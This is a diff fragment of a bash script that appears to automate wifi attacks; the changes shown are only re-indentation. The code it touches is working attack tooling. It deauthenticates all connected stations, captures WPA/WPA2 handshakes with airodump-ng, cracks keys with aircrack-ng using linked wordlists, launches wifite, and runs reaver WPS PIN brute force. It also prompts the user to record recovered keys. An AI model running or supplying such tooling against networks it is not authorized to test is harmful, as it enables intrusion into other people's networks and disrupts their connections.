-doSleepMessage
-sleep 1
-arAttackDeAuthOnRetry
-captureHandshakeWPA
-;;
-esac
+	"1")
+	sleepMessage="Preparing to De-Authenticate All Connected Stations...."
+	doSleepMessage
+	sleep 1
+	arAttackDeAuthOnRetry
+	captureHandshakeWPA
+	;;
+	esac
 
 }
 
 
 adFileDumpWPA(){
 
-currentTask="adFileDumpWPA"
+	currentTask="adFileDumpWPA"
 
-sleepMessage="Preparing to Capture WPA Handshake...."
-doSleepMessage
-sleep 3
+	sleepMessage="Preparing to Capture WPA Handshake...."
+	doSleepMessage
+	sleep 3
 
-disableChannelHopping
+	disableChannelHopping
 
-$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
+	$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adFileDumpNoChannelWPA(){
 
-currentTask="adFileDumpNoChannelWPA"
+	currentTask="adFileDumpNoChannelWPA"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+	$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
 
-#Working (uses session path)
-#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
+	#Working (uses session path)
+	#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 aircrackDecryptWPA(){
 
-currentTask="aircrackDecryptWPA"
-lastMenuID="aircrackDecryptWPA"
+	currentTask="aircrackDecryptWPA"
+	lastMenuID="aircrackDecryptWPA"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
 
-sleepMessage="Preparing captured handshake for aircrack-ng...."
-doSleepMessage
-sleep 4
+	sleepMessage="Preparing captured handshake for aircrack-ng...."
+	doSleepMessage
+	sleep 4
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "You need darkc0de.lst to crack the key, or another list:"
-echo ""
-echo "Mirror (Direct):"
-echo "https://drive.google.com/file/d/0B-c-aPfOv8-SOHA0QVRiOE5tRVk/edit?usp=sharing"
-echo ""
-echo ""
-echo "You may press C and ENTER to load a custom list"
-echo ""
-echo ""
-echo "Another Example Wordlist Collection:"
-echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
-echo ""
-echo ""
-echo "You may also press B and ENTER to run a besside-ng attack"
-echo ""
-echo ""
-echo "Press ENTER once you have a list file in the same directory as the script"
-echo ""
-echo ""
+	echo ""
+	echo "You need darkc0de.lst to crack the key, or another list:"
+	echo ""
+	echo "Mirror (Direct):"
+	echo "https://drive.google.com/file/d/0B-c-aPfOv8-SOHA0QVRiOE5tRVk/edit?usp=sharing"
+	echo ""
+	echo ""
+	echo "You may press C and ENTER to load a custom list"
+	echo ""
+	echo ""
+	echo "Another Example Wordlist Collection:"
+	echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
+	echo ""
+	echo ""
+	echo "You may also press B and ENTER to run a besside-ng attack"
+	echo ""
+	echo ""
+	echo "Press ENTER once you have a list file in the same directory as the script"
+	echo ""
+	echo ""
 
-read tmpPause
+	read tmpPause
 
-case "$tmpPause" in
+	case "$tmpPause" in
 
-"")
-$terminal aircrack-ng -w $wordlist -b $bssid *.cap
-;;
+	"")
+	$terminal aircrack-ng -w $wordlist -b $bssid *.cap
+	;;
 
-"C" | "c")
-getCustomList
-;;
+	"C" | "c")
+	getCustomList
+	;;
 
-"B" | "b")
-bessideMain
-;;
+	"B" | "b")
+	bessideMain
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-esac
+	esac
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-#echo ""
-#echo ""
-#echo ""
-#echo "FOUND KEY: "
-echo ""
-echo "WPA Attack Is Currently Running!"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
-echo ""
-echo ""
-echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
-echo ""
-echo ""
-echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
-echo ""
-echo ""
+	#echo ""
+	#echo ""
+	#echo ""
+	#echo "FOUND KEY: "
+	echo ""
+	echo "WPA Attack Is Currently Running!"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
+	echo ""
+	echo ""
+	echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
+	echo ""
+	echo ""
+	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
+	echo ""
+	echo ""
 
-read acPause
+	read acPause
 
-case "$acPause" in
+	case "$acPause" in
 
-"")
-killAll
-menuAttacksWPA
-;;
+	"")
+	killAll
+	menuAttacksWPA
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-esac
+	esac
 
 }
 
 
 captureHandshakeWPA(){
 
-currentTask="captureHandshakeWPA"
-lastMenuID="captureHandshakeWPA"
+	currentTask="captureHandshakeWPA"
+	lastMenuID="captureHandshakeWPA"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "The airodump window is open. Look in top right hand corner for the handshake"
-echo ""
-echo "Once handshake is complete, you may close the airodump window."
-echo ""
-echo ""
-echo "Example: [ WPA handshake: $bssid ]"
-echo ""
-echo ""
-echo ""
-echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Press ENTER to continue once handshake is made...."
-echo ""
-echo ""
+	echo ""
+	echo "The airodump window is open. Look in top right hand corner for the handshake"
+	echo ""
+	echo "Once handshake is complete, you may close the airodump window."
+	echo ""
+	echo ""
+	echo "Example: [ WPA handshake: $bssid ]"
+	echo ""
+	echo ""
+	echo ""
+	echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Press ENTER to continue once handshake is made...."
+	echo ""
+	echo ""
 
-read captureHandshake
+	read captureHandshake
 
-case "$captureHandshake" in
+	case "$captureHandshake" in
 
-"")
-killAirodump
-killAireplay
+	"")
+	killAirodump
+	killAireplay
 
-sleepMessage="Preparing capture files for aircrack-ng...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing capture files for aircrack-ng...."
+	doSleepMessage
+	sleep 2
 
-aircrackDecrypt
-;;
+	aircrackDecrypt
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"D" | "d")
-retryDeauth="1"
-menuAttacksWPA
-;;
+	"D" | "d")
+	retryDeauth="1"
+	menuAttacksWPA
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-menuAttacksWPA
-;;
+	*)
+	menuAttacksWPA
+	;;
 
-esac
+	esac
 
 }
 
 
 menuAttacksWPAWifiteAuto(){
 
-currentTask="menuAttacksWPAWifiteAuto"
-lastMenuID="menuAttacksWPAWifiteAuto"
+	currentTask="menuAttacksWPAWifiteAuto"
+	lastMenuID="menuAttacksWPAWifiteAuto"
 
-killAll
+	killAll
 
-#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
-$terminal $wifiteAttackWPA &
+	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
+	$terminal $wifiteAttackWPA &
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "The wifite session should be launched in a separate window."
-echo ""
-echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
-echo ""
-echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
-echo ""
+	echo ""
+	echo "The wifite session should be launched in a separate window."
+	echo ""
+	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
+	echo ""
+	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
+	echo ""
 
-read pause
+	read pause
 
-killAll
-menuAuto
+	killAll
+	menuAuto
 
 }
 
@@ -4143,415 +4155,415 @@ menuAuto
 
 autoModeNoPreviousSessionWPA2(){
 
-currentTask="autoModeNoPreviousSessionWPA2"
+	currentTask="autoModeNoPreviousSessionWPA2"
 
-adAPScanNoChannel
+	adAPScanNoChannel
 
-sleepMessage="Setting Up User Input...."
-doSleepMessage
-sleep 2
+	sleepMessage="Setting Up User Input...."
+	doSleepMessage
+	sleep 2
 
-getESSID
-getBSSID
-getChannel
+	getESSID
+	getBSSID
+	getChannel
 
-sessionWriteBeginNew
-sessionCopyNewCaptureFiles
+	sessionWriteBeginNew
+	sessionCopyNewCaptureFiles
 
-sleepMessage="Killing Airodump Window...."
-doSleepMessage
-sleep 2
+	sleepMessage="Killing Airodump Window...."
+	doSleepMessage
+	sleep 2
 
 
-killAirodump
+	killAirodump
 
-menuAttacksWPA2
+	menuAttacksWPA2
 
-echo ""
-echo ""
-echo "Press any key to continue...."
-echo ""
-echo ""
+	echo ""
+	echo ""
+	echo "Press any key to continue...."
+	echo ""
+	echo ""
 
-read pause
+	read pause
 
 }
 
 
 autoModeUsePreviousSessionWPA2(){
 
-currentTask="autoModeUsePreviousSessionWPA2"
+	currentTask="autoModeUsePreviousSessionWPA2"
 
-sessionWriteLoadPrevious
+	sessionWriteLoadPrevious
 
-menuAttacksWPA2
+	menuAttacksWPA2
 
-echo ""
-echo ""
-echo "Press any key to continue...."
-echo ""
-echo ""
+	echo ""
+	echo ""
+	echo "Press any key to continue...."
+	echo ""
+	echo ""
 
-read pause
+	read pause
 
 }
 
 
 menuAttacksWPA2(){
 
-currentTask="menuAttacksWPA2"
+	currentTask="menuAttacksWPA2"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-# Only run a deauth with default text and settings if not re-forced through menu
-case "$retryDeauth" in
+	# Only run a deauth with default text and settings if not re-forced through menu
+	case "$retryDeauth" in
 
-"0")
-killAll
+	"0")
+	killAll
 
-adFileDump
+	adFileDump
 
-sleepMessage="Preparing to Capture WPA Handshake...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing to Capture WPA Handshake...."
+	doSleepMessage
+	sleep 2
 
-arAttackDeAuth
-captureHandshakeWPA2
-;;
+	arAttackDeAuth
+	captureHandshakeWPA2
+	;;
 
-"1")
-sleepMessage="Preparing to De-Authenticate All Connected Stations...."
-doSleepMessage
-sleep 1
-arAttackDeAuthOnRetry
-captureHandshakeWPA2
-;;
-esac
+	"1")
+	sleepMessage="Preparing to De-Authenticate All Connected Stations...."
+	doSleepMessage
+	sleep 1
+	arAttackDeAuthOnRetry
+	captureHandshakeWPA2
+	;;
+	esac
 
 }
 
 
 adFileDumpWPA2(){
 
-currentTask="adFileDumpWPA2"
+	currentTask="adFileDumpWPA2"
 
-sleepMessage="Preparing to Capture WPA Handshake...."
-doSleepMessage
-sleep 3
+	sleepMessage="Preparing to Capture WPA Handshake...."
+	doSleepMessage
+	sleep 3
 
-disableChannelHopping
+	disableChannelHopping
 
-$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
+	$terminal airodump-ng $interfaceMonitor --bssid $bssid --channel $channel --write "dump_$essid"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 adFileDumpNoChannelWPA2(){
 
-currentTask="adFileDumpNoChannelWPA2"
+	currentTask="adFileDumpNoChannelWPA2"
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
-$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
+	$terminal airodump-ng -w "dump_$essid" --bssid $bssid -i $interfaceMonitor &
 
-#Working (uses session path)
-#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
+	#Working (uses session path)
+	#$terminal airodump-ng -w "$capturePath/$encryptionType/dump_$essid" --bssid $bssid -i $interfaceMonitor &
 
-echo ""
-echo ""
+	echo ""
+	echo ""
 
 }
 
 
 aircrackDecryptWPA2(){
 
-currentTask="aircrackDecryptWPA2"
-lastMenuID="aircrackDecryptWPA2"
+	currentTask="aircrackDecryptWPA2"
+	lastMenuID="aircrackDecryptWPA2"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
 
-sleepMessage="Preparing captured handshake for aircrack-ng...."
-doSleepMessage
-sleep 4
+	sleepMessage="Preparing captured handshake for aircrack-ng...."
+	doSleepMessage
+	sleep 4
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "You need darkc0de.lst to crack the key, or another list:"
-echo ""
-echo "Mirror (Direct):"
-echo "https://drive.google.com/file/d/0B-c-aPfOv8-SOHA0QVRiOE5tRVk/edit?usp=sharing"
-echo ""
-echo ""
-echo "You may press C and ENTER to load a custom list"
-echo ""
-echo ""
-echo "Another Example Wordlist Collection:"
-echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
-echo ""
-echo ""
-echo "You may also press B and ENTER to run a besside-ng attack"
-echo ""
-echo ""
-echo "Press ENTER once you have a list file in the same directory as the script"
-echo ""
-echo ""
+	echo ""
+	echo "You need darkc0de.lst to crack the key, or another list:"
+	echo ""
+	echo "Mirror (Direct):"
+	echo "https://drive.google.com/file/d/0B-c-aPfOv8-SOHA0QVRiOE5tRVk/edit?usp=sharing"
+	echo ""
+	echo ""
+	echo "You may press C and ENTER to load a custom list"
+	echo ""
+	echo ""
+	echo "Another Example Wordlist Collection:"
+	echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
+	echo ""
+	echo ""
+	echo "You may also press B and ENTER to run a besside-ng attack"
+	echo ""
+	echo ""
+	echo "Press ENTER once you have a list file in the same directory as the script"
+	echo ""
+	echo ""
 
-read tmpPause
+	read tmpPause
 
-case "$tmpPause" in
+	case "$tmpPause" in
 
-"")
-$terminal aircrack-ng -w $wordlist -b $bssid *.cap
-;;
+	"")
+	$terminal aircrack-ng -w $wordlist -b $bssid *.cap
+	;;
 
-"C" | "c")
-getCustomList
-;;
+	"C" | "c")
+	getCustomList
+	;;
 
-"B" | "b")
-bessideMain
-;;
+	"B" | "b")
+	bessideMain
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-esac
+	esac
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-#echo ""
-#echo ""
-#echo ""
-#echo "FOUND KEY: "
-echo ""
-echo "WPA2 Attack Is Currently Running!"
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo ""
-echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
-echo ""
-echo ""
-echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
-echo ""
-echo ""
-echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
-echo ""
-echo ""
+	#echo ""
+	#echo ""
+	#echo ""
+	#echo "FOUND KEY: "
+	echo ""
+	echo "WPA2 Attack Is Currently Running!"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
+	echo ""
+	echo ""
+	echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
+	echo ""
+	echo ""
+	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
+	echo ""
+	echo ""
 
-read acPause
+	read acPause
 
-case "$acPause" in
+	case "$acPause" in
 
-"")
-killAll
-menuAttacksWPA2
-;;
+	"")
+	killAll
+	menuAttacksWPA2
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-esac
+	esac
 
 }
 
 
 captureHandshakeWPA2(){
 
-currentTask="captureHandshakeWPA2"
-lastMenuID="captureHandshakeWPA2"
+	currentTask="captureHandshakeWPA2"
+	lastMenuID="captureHandshakeWPA2"
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "The airodump window is open. Look in top right hand corner for the handshake"
-echo ""
-echo "Once handshake is complete, you may close the airodump window."
-echo ""
-echo ""
-echo "Example: [ WPA handshake: $bssid ]"
-echo ""
-echo ""
-echo ""
-echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Press ENTER to continue once handshake is made...."
-echo ""
-echo ""
+	echo ""
+	echo "The airodump window is open. Look in top right hand corner for the handshake"
+	echo ""
+	echo "Once handshake is complete, you may close the airodump window."
+	echo ""
+	echo ""
+	echo "Example: [ WPA handshake: $bssid ]"
+	echo ""
+	echo ""
+	echo ""
+	echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Press ENTER to continue once handshake is made...."
+	echo ""
+	echo ""
 
-read captureHandshake
+	read captureHandshake
 
-case "$captureHandshake" in
+	case "$captureHandshake" in
 
-"")
-killAirodump
-killAireplay
+	"")
+	killAirodump
+	killAireplay
 
-sleepMessage="Preparing capture files for aircrack-ng...."
-doSleepMessage
-sleep 2
+	sleepMessage="Preparing capture files for aircrack-ng...."
+	doSleepMessage
+	sleep 2
 
-aircrackDecrypt
-;;
+	aircrackDecrypt
+	;;
 
-"M" | "m")
-killAll
-stopMonitorMode
-menuMain
-;;
+	"M" | "m")
+	killAll
+	stopMonitorMode
+	menuMain
+	;;
 
-"D" | "d")
-retryDeauth="1"
-menuAttacksWPA2
-;;
+	"D" | "d")
+	retryDeauth="1"
+	menuAttacksWPA2
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
+	;;
 
-"S" | "s")
-menuSessionSave
-;;
+	"S" | "s")
+	menuSessionSave
+	;;
 
-"L" | "l")
-menuSessionLoad
-;;
+	"L" | "l")
+	menuSessionLoad
+	;;
 
-"Z" | "z")
-menuHoneyPotMode
-;;
+	"Z" | "z")
+	menuHoneyPotMode
+	;;
 
-"H" | "h")
-menuHelp
-;;
+	"H" | "h")
+	menuHelp
+	;;
 
-"E" | "e")
-menuExtras
-;;
+	"E" | "e")
+	menuExtras
+	;;
 
-"X" | "x")
-killAll
-stopMonitorMode
-bannerExit
-;;
+	"X" | "x")
+	killAll
+	stopMonitorMode
+	bannerExit
+	;;
 
-*)
-menuAttacksWPA2
-;;
+	*)
+	menuAttacksWPA2
+	;;
 
-esac
+	esac
 
 }
 
 
 menuAttacksWPA2WifiteAuto(){
 
-currentTask="menuAttacksWPA2WifiteAuto"
-lastMenuID="menuAttacksWPA2WifiteAuto"
+	currentTask="menuAttacksWPA2WifiteAuto"
+	lastMenuID="menuAttacksWPA2WifiteAuto"
 
-killAll
+	killAll
 
-#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
-$terminal $wifiteAttackWPA2 &
+	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
+	$terminal $wifiteAttackWPA2 &
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "The wifite session should be launched in a separate window."
-echo ""
-echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
-echo ""
-echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
-echo ""
+	echo ""
+	echo "The wifite session should be launched in a separate window."
+	echo ""
+	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
+	echo ""
+	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
+	echo ""
 
-read pause
+	read pause
 
-killAll
-menuAuto
+	killAll
+	menuAuto
 
 }
 
@@ -4571,180 +4583,180 @@ menuAuto
 
 autoModeNoPreviousSessionWPS(){
 
-currentTask="autoModeNoPreviousSessionWPS"
+	currentTask="autoModeNoPreviousSessionWPS"
 
-adAPScanWifiteWPSNoChannel
-adAPScanNoChannel
+	adAPScanWifiteWPSNoChannel
+	adAPScanNoChannel
 
-sleepMessage="Setting Up User Input...."
-doSleepMessage
-sleep 2
+	sleepMessage="Setting Up User Input...."
+	doSleepMessage
+	sleep 2
 
-getESSID
-getBSSID
-getChannel
+	getESSID
+	getBSSID
+	getChannel
 
-sessionWriteBeginNew
-sessionCopyNewCaptureFiles
+	sessionWriteBeginNew
+	sessionCopyNewCaptureFiles
 
-sleepMessage="Killing Airodump Window...."
-doSleepMessage
-sleep 2
+	sleepMessage="Killing Airodump Window...."
+	doSleepMessage
+	sleep 2
 
 
-killAirodump
-killWifite
+	killAirodump
+	killWifite
 
-getBSSIDCharOnly
-reaverSaveAllSessionFiles
+	getBSSIDCharOnly
+	reaverSaveAllSessionFiles
 
-menuAttacksWPS
+	menuAttacksWPS
 
 }
 
 
 autoModeUsePreviousSessionWPS(){
 
-currentTask="autoModeUsePreviousSessionWPS"
+	currentTask="autoModeUsePreviousSessionWPS"
 
-sessionWriteLoadPrevious
+	sessionWriteLoadPrevious
 
-menuAttacksWPS
+	menuAttacksWPS
 
 }
 
 
 menuAttacksWPS(){
 
-currentTask="menuAttacksWPS"
+	currentTask="menuAttacksWPS"
 
 
-sleepMessage="Preparing Reaver Session...."
-doSleepMessage
-sleep 1
+	sleepMessage="Preparing Reaver Session...."
+	doSleepMessage
+	sleep 1
 
-killAirodump
+	killAirodump
 
-disableChannelHopping
+	disableChannelHopping
 
-sleepMessage="Preparing Reaver Session...."
-doSleepMessage
-sleep 1
+	sleepMessage="Preparing Reaver Session...."
+	doSleepMessage
+	sleep 1
 
-sleepMessage="Launching Reaver Session...."
-doSleepMessage
-sleep 2
+	sleepMessage="Launching Reaver Session...."
+	doSleepMessage
+	sleep 2
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-sleepMessage="Reaver Session Active!"
-doSleepMessage
-echo ""
-echo "Press CTRL+C At Any Time To Stop Current Session and Save"
-sleep 2
+	sleepMessage="Reaver Session Active!"
+	doSleepMessage
+	echo ""
+	echo "Press CTRL+C At Any Time To Stop Current Session and Save"
+	sleep 2
 
-$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
+	$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
 
-echo ""
-echo ""
-echo "Your reaver session has been saved!"
-echo ""
-echo ""
-echo ""
-echo ""
-echo "If the key is available, now would be a good time to do the following:"
-echo ""
-echo "1) Write down the WPA/WPA2 key and/or WPS pin"
-echo ""
-echo "2) Take a picture of the screen to keep a record of the keys"
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Press ENTER to continue...."
-echo ""
-echo ""
+	echo ""
+	echo ""
+	echo "Your reaver session has been saved!"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "If the key is available, now would be a good time to do the following:"
+	echo ""
+	echo "1) Write down the WPA/WPA2 key and/or WPS pin"
+	echo ""
+	echo "2) Take a picture of the screen to keep a record of the keys"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Press ENTER to continue...."
+	echo ""
+	echo ""
 
-getBSSIDCharOnly
-reaverSaveCurrentSessionFile
+	getBSSIDCharOnly
+	reaverSaveCurrentSessionFile
 
-read pause
+	read pause
 
 }
 
 
 menuAttacksWPSWifiteAuto(){
 
-currentTask="menuAttacksWPSWifiteAuto"
-lastMenuID="menuAttacksWPSWifiteAuto"
+	currentTask="menuAttacksWPSWifiteAuto"
+	lastMenuID="menuAttacksWPSWifiteAuto"
 
-killAll
+	killAll
 
-#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
-$terminal $wifiteAttackWPS &
+	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
+	$terminal $wifiteAttackWPS &
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "The wifite session should be launched in a separate window."
-echo ""
-echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
-echo ""
-echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
-echo ""
+	echo ""
+	echo "The wifite session should be launched in a separate window."
+	echo ""
+	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
+	echo ""
+	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
+	echo ""
 
-read pause
+	read pause
 
-echo ""
-echo ""
-echo "Your wifite session has been saved!"
-echo ""
-echo ""
-echo ""
-echo ""
-echo "If the key is available, now would be a good time to do the following:"
-echo ""
-echo "1) Write down the WPA/WPA2 key and/or WPS pin"
-echo ""
-echo "2) Take a picture of the screen to keep a record of the keys"
-echo ""
-echo ""
-echo ""
-echo ""
-echo "Press ENTER to continue...."
-echo ""
-echo ""
+	echo ""
+	echo ""
+	echo "Your wifite session has been saved!"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "If the key is available, now would be a good time to do the following:"
+	echo ""
+	echo "1) Write down the WPA/WPA2 key and/or WPS pin"
+	echo ""
+	echo "2) Take a picture of the screen to keep a record of the keys"
+	echo ""
+	echo ""
+	echo ""
+	echo ""
+	echo "Press ENTER to continue...."
+	echo ""
+	echo ""
 
-killAll
-menuAuto
+	killAll
+	menuAuto
 
-read pause
+	read pause
 
 }
 
 
 aircrackDecryptWPS(){
 
